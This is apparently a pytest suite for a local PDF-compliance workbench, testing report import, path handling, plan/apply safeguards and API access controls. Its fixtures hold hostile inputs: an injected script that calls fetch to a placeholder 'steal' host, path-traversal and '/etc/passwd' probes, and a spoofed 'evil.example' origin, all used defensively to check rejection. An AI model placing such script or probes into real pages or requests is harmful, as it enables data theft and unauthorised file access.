import base64
import hashlib
import http.client
import json
from pathlib import Path
import threading
import time

import pytest

from ezctd.cli import _default_rulepack
from ezctd.workspace import Workspace
from ezctd.workbench import LocalServer
from ezctd.safe_io import sha256_file


def report_bytes(path='./clinical/report.pdf'):
    rows=[]
    for number in range(1,27):
        rows.append(f'<tr><td><svg><path fill="{"#F25858" if number==12 else "#3BBC86"}"></path></svg></td><td>6.{number}</td><td>规则</td></tr>')
        if number==12:
            rows.append('<tr><td></td><td colspan="2">详情共计 1 条</td></tr>')
            rows.append(f'<tr><td></td><td colspan="2"><ul><li>{path}<br>页码：[1]，超链接：[10,20,30,40]</li></ul></td></tr>')
    text='<html><script>window.PWNED=true; fetch("https://example.invalid/steal");</script><table><tr><th>执行日期/时间</th><td>2026-05-13 17:22:14</td></tr><tr><td><a href="#section_6">6-PDF分析</a></td><td>0</td><td>0</td><td>1</td></tr></table><div id="section_6">6</div><table>'+''.join(rows)+'</table></html>'
    return b'\xef\xbb\xbf'+text.encode('utf-8')


@pytest.fixture
def workspace(tmp_path,pdf_factory):
    root=tmp_path/'input'
    pdf_factory(root/'clinical'/'report.pdf',pages=2,bookmark=True)
    pdf_factory(root/'other'/'report.pdf',linearize=True)
    w=Workspace(root,tmp_path/'output',_default_rulepack())
    yield w
    w.close()
    deadline=time.monotonic()+15
    while any(j['status'] in ('RUNNING','QUEUED','FINALIZING') for j in w.jobs.values()) and time.monotonic()<deadline:
        time.sleep(.02)


def wait(w,ident):
    end=time.monotonic()+30
    while time.monotonic()<end:
        job=w.job(ident)
        if job['status'] not in ('QUEUED','RUNNING','FINALIZING'): return job
        time.sleep(.02)
    raise AssertionError('job did not terminate')


def test_workspace_requires_nonoverlapping_roots(tmp_path,pdf_factory):
    source=pdf_factory(tmp_path/'input'/'x.pdf')
    with pytest.raises(ValueError):Workspace(source.parent,source.parent/'out',_default_rulepack())
    with pytest.raises(ValueError):Workspace(source.parent,tmp_path,_default_rulepack())
    assert not (source.parent/'out').exists()


def test_report_exact_path_candidate_never_becomes_old_byte_identity(workspace):
    raw=report_bytes(); result=workspace.import_report(raw)
    assert result['binding_summary']['matched_documents']==1
    assert result['binding_summary']['historical_pdf_byte_identity']=='NOT_ESTABLISHED'
    assert workspace.report['source_sha256']==hashlib.sha256(raw).hexdigest()
    row=workspace.details('1')['report_items'][0]
    assert row['reported_page_raw']=='1' and row['locator_verified_against_pdf'] is False
    assert workspace.details('2')['report_items']==[]


@pytest.mark.parametrize('path',['../outside.pdf','/etc/outside.pdf','C:\\private.pdf','report.pdf'])
def test_report_paths_not_followed_or_matched_by_basename(workspace,path):
    result=workspace.import_report(report_bytes(path))
    assert result['binding_summary']['matched_documents']==0
    assert result['binding_summary']['unmatched_observations']==1


def test_source_changes_invalidate_cached_results(workspace):
    workspace.details('1')
    source=workspace.docs['1'].path;source.write_bytes(source.read_bytes()+b'\n%new version')
    with pytest.raises(ValueError,match='SOURCE_CHANGED'):workspace.details('1')


def test_plan_apply_uses_fixed_source_and_noop_is_skipped(workspace):
    before={d.id:sha256_file(d.path) for d in workspace.docs.values()}
    ident=workspace.start('plan',['1','2']);plan=wait(workspace,ident)
    assert plan['status']=='COMPLETED'
    assert [r['eligibility'] for r in plan['results']]==['ELIGIBLE','NO_CHANGE_NEEDED']
    with pytest.raises(ValueError):workspace.start('apply',plan_id=ident,confirmed=False)
    applied=wait(workspace,workspace.start('apply',plan_id=ident,confirmed=True))
    assert applied['status']=='COMPLETED' and applied['total']==1
    assert applied['results'][0]['status']=='VERIFIED_COPY'
    target=workspace.output/applied['results'][0]['output_relative']
    assert target.is_file() and target.with_name(target.name+'.ezctd.json').is_file()
    assert {d.id:sha256_file(d.path) for d in workspace.docs.values()}==before
    assert all(row.get('unchanged') for row in applied['input_integrity'])
    assert (workspace.output/'jobs'/f'{applied["id"]}.json').is_file()
    with pytest.raises(ValueError):workspace.start('apply',plan_id=ident,confirmed=True)


def test_changed_input_after_plan_is_never_rewritten(workspace):
    plan=workspace.start('plan',['1']);assert wait(workspace,plan)['status']=='COMPLETED'
    source=workspace.docs['1'].path;source.write_bytes(source.read_bytes()+b'\n%new version')
    applied=wait(workspace,workspace.start('apply',plan_id=plan,confirmed=True))
    assert applied['status']=='COMPLETED_WITH_ERRORS'
    assert not list((workspace.output/'copies').rglob('*.pdf'))


def test_context_is_explicit_and_invalidates_plan(workspace):
    plan=workspace.start('plan',['1']);wait(workspace,plan)
    workspace.set_context('1',{'node_id':'5.4','document_role':'reference','language':'zh'})
    assert workspace.session()['files'][0]['context']['node_id']=='5.4'
    with pytest.raises(ValueError):workspace.start('apply',plan_id=plan,confirmed=True)
    with pytest.raises(ValueError):workspace.set_context('1',{'force_pass':'yes'})


def test_workspace_scan_includes_unresolved_rules_and_job_evidence(workspace):
    ident=workspace.start('scan',['1']);job=wait(workspace,ident)
    assert job['status']=='COMPLETED'
    rows=job['results'][0]['result']['rule_evaluations']
    assert len(rows)==26 and any(row['status']=='INDETERMINATE' for row in rows)
    assert workspace.details('1')['scan'] is not None
    assert (workspace.output/'jobs'/f'{ident}.json').is_file()


def test_cancel_job_and_reject_concurrent_work(workspace):
    ident=workspace.start('scan',['1','2'])
    with pytest.raises(ValueError,match='active'):workspace.start('plan',['1'])
    workspace.cancel(ident)
    assert wait(workspace,ident)['status']=='CANCELLED'


@pytest.fixture
def server(workspace):
    s=LocalServer(workspace)
    t=threading.Thread(target=s.serve_forever,kwargs={'poll_interval':.02},daemon=True);t.start()
    yield s
    s.shutdown();s.server_close();t.join(2)


def request(s,route,payload=None,headers=None,method='POST'):
    conn=http.client.HTTPConnection('127.0.0.1',s.server_port,timeout=10)
    hs={'Content-Type':'application/json','Origin':s.origin,'Authorization':'Bearer '+s.token}
    hs.update(headers or {})
    conn.request(method,route,body=json.dumps(payload or {}).encode(),headers=hs)
    response=conn.getresponse();data=response.read();status=response.status;rh=dict(response.getheaders());conn.close()
    return status,data,rh


@pytest.mark.parametrize('headers',[{'Authorization':'Bearer wrong'}, {'Origin':'https://evil.example'},
    {'Origin':'null'},{'Host':'evil.example'},{'Sec-Fetch-Site':'cross-site'}])
def test_api_rejects_unauthorized_and_rebinding(server,headers):
    status,body,_=request(server,'/api/session',headers=headers)
    assert status==403 and b'files' not in body


def test_only_explicit_assets_are_served(server):
    status,body,headers=request(server,'/',method='GET')
    assert status==200 and b'/app.js' in body and 'frame-ancestors' in headers['Content-Security-Policy']
    assert server.token.encode() not in body
    for route in ['/api/session','/etc/passwd','/../workspace.py','/?key='+server.token]:
        assert request(server,route,method='GET')[0]==404


def test_api_reads_real_page_without_arbitrary_paths(server):
    assert request(server,'/api/page',{'id':'/etc/passwd'})[0]==400
    status,data,_=request(server,'/api/page',{'id':'1','page':1,'query':'12.50'})
    assert status==200
    result=json.loads(data)
    assert result['png_base64'] and len(result['search_matches'][0]['rectangles_px'])==5
    assert result['input_integrity']['unchanged']


def test_api_preserves_report_original_bytes(server):
    raw=report_bytes()
    status,data,_=request(server,'/api/report',{'report_base64':base64.b64encode(raw).decode()})
    assert status==200 and json.loads(data)['binding_summary']['matched_documents']==1
    assert server.workspace.report['source_sha256']==hashlib.sha256(raw).hexdigest()
    assert request(server,'/api/report',{'report_base64':'invalid**'})[0]==400


def test_api_no_nonjson_or_unconfirmed_apply(server):
    assert request(server,'/api/session',headers={'Content-Type':'text/plain'})[0]==415
    assert request(server,'/api/apply',{'plan_id':'fake','confirmed':True})[0]==400
    assert request(server,'/api/page',{'id':'1','page':True})[0]==400
